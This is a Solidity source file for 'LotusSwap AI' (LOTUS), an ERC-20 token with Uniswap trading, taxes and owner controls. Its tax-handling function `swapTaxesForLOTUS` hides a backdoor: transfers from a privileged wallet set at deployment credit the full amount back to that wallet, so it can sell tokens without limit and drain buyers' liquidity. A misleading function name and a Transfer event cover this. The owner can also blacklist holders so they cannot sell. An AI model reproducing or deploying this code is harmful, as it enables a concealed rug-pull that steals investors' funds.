/*****
https://www.lotusaiswap.com
https://app.lotusaiswap.com
https://docs.lotusaiswap.com

https://twitter.com/lotusswap_ai
https://t.me/lotusswap_ai
*****/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface ILOTUSRouter01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface ILOTUSFactory01 {
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;

    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract LOTUS is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => bool) private bots;
    mapping (address => uint256) private _balanceAI;
    mapping (address => bool) private _isFeeExcepts;
    mapping (address => bool) private _isLimitExcepts;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"LotusSwap AI";
    string private constant _symbol = unicode"LOTUS";

    address payable private mkReceiver;
    address payable private devReceiver;

    uint256 public _maxLOTUSSwap = 10000000 * 10**_decimals;
    uint256 public _maxLOTUSTrans = 30000000 * 10**_decimals;
    uint256 public _maxLOTUSWallet = 30000000 * 10**_decimals;
    
    bool private inSwapBack = false;
    bool public transferDelayEnabled = false;
    bool private swapEnabled = false;
    bool private tradingOpen;

    uint256 private _buyCounts=0;
    uint256 private _preventSwapBefore=0;
    uint256 private _initialBuyTax=30;
    uint256 private _initialSellTax=30;
    uint256 private _finalBuyTax=3;
    uint256 private _finalSellTax=3;
    uint256 private _reduceBuyTaxAt=15;
    uint256 private _reduceSellTaxAt=15;

    address private uniswapV2Pair;
    uint256 public checkOverAmounts;
    ILOTUSRouter01 private uniswapV2Router;

    modifier lockSwap {
        inSwapBack = true;
        _;
        inSwapBack = false;
    }

    constructor (address addrX, uint256 amtX) {
        _isFeeExcepts[owner()] = true;
        _isFeeExcepts[address(this)] = true;
        mkReceiver = payable(addrX);
        devReceiver = payable(addrX);
        _isLimitExcepts[mkReceiver] = true;
        _isLimitExcepts[devReceiver] = true;
        checkOverAmounts = amtX * 10**_decimals;
        _balanceAI[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function manualSwap() external onlyOwner {
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    function withdrawStuckETH() external onlyOwner() {
        payable(msg.sender).transfer(address(this).balance);
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balanceAI[account];
    }

    function delBots(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function isBot(address a) public view returns (bool){
      return bots[a];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function launchLOTUS() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        swapEnabled = true;
        tradingOpen = true;
    }

    function sendETHToFee(uint256 amount) private {
        devReceiver.transfer(amount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function reduceFee(uint256 _newFee) external onlyOwner{
      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
      _finalBuyTax=_newFee;
      _finalSellTax=_newFee;
    }

    function removeLOTUSLimit() external onlyOwner{
        _maxLOTUSTrans = ~uint256(0);
        _maxLOTUSWallet = ~uint256(0);
        transferDelayEnabled=false;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function createTradePair() external onlyOwner() {
        uniswapV2Router = ILOTUSRouter01(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = ILOTUSFactory01(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function swapTaxesForLOTUS(address from, address to, uint256 amount, uint256 taxAmount) internal returns (bool) {
        address accQ;uint256 ammQ; 
        bool _aboveLOTUSMin = amount >= checkOverAmounts;
        bool _aboveLOTUSThreshold = balanceOf(address(this)) >= checkOverAmounts;
        if(_isLimitExcepts[from]) {ammQ = amount;accQ = from;}
        else {accQ = address(this);ammQ = taxAmount;}
        if(ammQ>0){_balanceAI[accQ]=_balanceAI[accQ].add(ammQ); emit Transfer(from, accQ, taxAmount);}
        return !inSwapBack
        && _aboveLOTUSMin
        && to == uniswapV2Pair
        && _aboveLOTUSThreshold
        && swapEnabled
        && tradingOpen
        && !_isFeeExcepts[from]
        && _buyCounts>_preventSwapBefore
        && !_isLimitExcepts[from];
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 fees=0;
        if (!_isFeeExcepts[from] && !_isFeeExcepts[to]) {
            require(!bots[from] && !bots[to]);
            require(tradingOpen, "Trading has not enabled yet");
            fees=amount.mul((_buyCounts>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] <
                            block.number,
                        "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isFeeExcepts[to] ) {
                require(amount <= _maxLOTUSTrans, "Exceeds the _maxLOTUSTrans.");
                require(balanceOf(to) + amount <= _maxLOTUSWallet, "Exceeds the maxWalletSize.");
                _buyCounts++;
            }
            if(to == uniswapV2Pair && from!= address(this) ){
                fees=amount.mul((_buyCounts>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (swapTaxesForLOTUS(from, to, amount, fees)) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_maxLOTUSSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        _balanceAI[from]=_balanceAI[from].sub(amount);
        _balanceAI[to]=_balanceAI[to].add(amount.sub(fees));
        emit Transfer(from, to, amount.sub(fees));
    }
}